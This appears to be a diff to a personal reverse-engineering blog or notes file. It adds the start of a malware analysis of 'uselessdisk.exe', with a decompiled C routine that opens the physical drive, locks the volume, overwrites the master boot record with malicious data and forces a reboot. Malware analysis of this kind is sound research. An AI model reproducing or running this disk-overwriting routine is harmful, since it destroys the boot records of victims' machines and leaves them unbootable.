@@ -949,3 +949,27 @@ Also, i'm really trying hard to switch to Ghidra, but everytime i use it remind 
 About the SSTIC challenged. I finished 12th on the first flag but couldn't find the others. imho, the 2nd flag was too far away. I was on the right path. I fully reverse engineered the binary, found the exploit (a poorly designed struct related to username, if i remember correctly), the exploit would have helped to poke the windows kernel and get a shell.
 
 Anyway, i'm busy analyzing a malware in my small spare time. An oldschool one corrupting the MBR. Good old time.
+
+### uselessdisk.exe
+
+I'm not done with it but here a summary of the important part :
+
+```c
+void k_writeToDiskShutdown(void)
+{
+
+k_createDataToWriteToDisk(&lpBuffer,&MBR_MALWARE,480);
+fhandle = CreateFileA("\\\\.\\PHYSICALDRIVE0",0xc0000000,FILESHARE_CHANGE_MODIFY,0, 3,0,0);
+
+if (fhandle == -1) {
+    fhandle = 0x401159; // <- ???
+    return;
+  }
+  DeviceIoControl(device,FSCTL_LOCK_VOLUME,0,0,0,0,&byteReturned, 0);
+  WriteFile(device,&lpBuffer,512,&nbOfByteWritten,0);
+  DeviceIoControl(device,0x9001c,0,0,0,0,&byteReturned,0);
+  CloseHandle(device); // :D
+  WinExec("shutdown -r -t 0",0);
+  ExitProcess(-1); // but... why ? :)
+}
+```
